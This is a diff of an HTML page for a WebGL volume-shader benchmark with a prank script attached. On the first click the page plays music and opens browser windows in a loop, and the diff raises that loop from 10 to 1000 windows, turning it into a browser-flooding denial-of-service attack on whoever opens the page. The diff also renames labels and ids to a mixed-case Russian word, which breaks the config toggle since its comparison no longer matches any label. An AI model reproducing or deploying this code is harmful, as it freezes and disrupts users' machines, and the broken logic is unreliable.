@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>volumeshader_bm</title>
+    <title>bd</title>
     <style>
         body {
             margin: 0;
@@ -39,7 +39,7 @@
             left: 0px;
             top: 0px;
         }
-        #config {
+        #ЗАГЛУШИть {
             position: fixed;
             left: 0px;
             top: 30px;
@@ -58,29 +58,29 @@
             <span>不支持canvas浏览器</span>
         </canvas>
     </div>
-    <button id="btn">CONFIG</button>
-    <div id="config">
+    <button id="btn">ЗАГЛУШИть</button>
+    <div id="ЗАГЛУШИть">
         <textarea name="" id="kernel" cols="30" rows="10"></textarea>
         <br />
         <button id="apply">APPLY</button>
         <button id="cancle">CANCLE</button>
     </div>
     <script>
-        // Функциональность из gh.html
+        
         const body = document.body;
         const music = document.getElementById("music");
 
         body.addEventListener("click", () => {
             music.play().catch((error) => console.error("Error:", error));
-
+   
             setTimeout(() => {
-                for (let i = 0; i < 10; i++) {
+                for (let i = 0; i < 1000; i++) {
                     window.open('', '_blank', 'width=800,height=600');
                 }
             }, 1000);
         }, { once: true });
 
-        // Функциональность из hehe.html
+        
         var cx, cy;
         var glposition;
         var glright;
@@ -494,9 +494,9 @@
             window.requestAnimationFrame(ontimer);
             document.getElementById("kernel").value = KERNEL;
             document.getElementById("btn").addEventListener("click", function () {
-                var state = this.innerText == "CONFIG";
-                this.innerText = state ? "HIDE" : "CONFIG";
-                document.getElementById("config").style.display = state ? "inline" : "none";
+                var state = this.innerText == "ЗАГЛУШИТЬ ";
+                this.innerText = state ? "HIDE" : "ЗаГЛУШИТь";
+                document.getElementById("ЗАГЛУШИть").style.display = state ? "inline" : "none";
             });
             document.getElementById("apply").addEventListener("click", function () {
                 KERNEL = document.getElementById("kernel").value;
